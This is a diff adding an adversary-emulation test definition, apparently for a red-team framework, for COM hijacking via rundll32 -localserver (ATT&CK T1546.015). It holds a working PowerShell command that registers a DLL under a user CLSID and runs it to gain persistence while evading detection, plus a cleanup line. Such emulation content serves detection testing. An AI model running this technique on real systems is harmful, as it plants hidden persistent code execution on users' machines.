@@ -1,0 +1,29 @@
+---
+- id: 4e80b3c50bd1fff09f4cfd628f031149
+  name: COM Hijacking with RunDLL32 (Local Server Switch)
+  description: "This test uses PowerShell to hijack a reference to a Component Object\
+    \ Model by creating registry values under InprocServer32 key in the HKCU hive\
+    \ then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\"\
+    . \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]'\
+    \ to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\n\
+    Upon successful execution of this test with the default options, whenever certain\
+    \ apps are opened (for example, Notepad), a calculator window will also be opened. "
+  tactic: multiple
+  technique:
+    attack_id: T1546.015
+    name: 'Event Triggered Execution: Component Object Model Hijacking'
+  platforms:
+    windows:
+      psh:
+        command: 'New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'' -Value
+          ''#{clsid_description}''; New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32''
+          -Value "#{dll_path}"; New-ItemProperty -Path ''HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32''
+          -Name ''ThreadingModel'' -Value ''#{clsid_threading}'' -PropertyType "String";
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList
+          ''-localserver #{clsid}'''
+        payloads: []
+        cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+          -Recurse -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
